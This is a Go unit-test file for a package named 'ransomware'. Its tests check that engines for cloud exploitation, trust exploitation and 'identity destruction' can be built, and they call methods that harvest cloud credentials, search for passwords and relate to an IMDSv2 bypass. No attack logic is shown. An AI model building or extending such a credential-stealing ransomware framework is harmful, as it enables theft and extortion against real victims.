package ransomware

import (
	"testing"
)

func TestNewCloudExploitEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	c := NewCloudExploitEngine(cfg)
	if c == nil {
		t.Fatal("NewCloudExploitEngine() returned nil")
	}
}

func TestNewTrustExploitEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	tEngine := NewTrustExploitEngine(cfg)
	if tEngine == nil {
		t.Fatal("NewTrustExploitEngine() returned nil")
	}
}

func TestNewIdentityDestructionEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	id := NewIdentityDestructionEngine(cfg)
	if id == nil {
		t.Fatal("NewIdentityDestructionEngine() returned nil")
	}
}

func TestCloudExploitEngineInit(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	c := NewCloudExploitEngine(cfg)

	creds := c.HarvestCloudCreds()
	if len(creds) == 0 {
		t.Log("HarvestCloudCreds returned 0 (expected in non-cloud env)")
	}
}

func TestIdentityDestructionStealCookies(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	id := NewIdentityDestructionEngine(cfg)

	data := id.SearchForPasswords()
	if len(data) == 0 {
		t.Log("SearchForPasswords returned 0 (expected in test env)")
	}
}

func TestTrustExploitEngineCerts(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	tEngine := NewTrustExploitEngine(cfg)

	cert, _, err := tEngine.GenerateSelfSignedCert("test.corp.local")
	if err != nil || cert == nil {
		t.Log("GenerateSelfSignedCert returned nil (expected if no crypto lib)")
	} else {
		t.Logf("Generated cert: %d bytes", len(cert))
	}
}

func TestIMDSv2BypassConfig(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	if cfg.AWSProfile != "default" {
		t.Errorf("expected AWSProfile=default, got %s", cfg.AWSProfile)
	}
	t.Logf("Cloud config: AWS=%s, Azure=%s, GCP=%s", cfg.AWSProfile, cfg.AzureProfile, cfg.GCPProject)
}
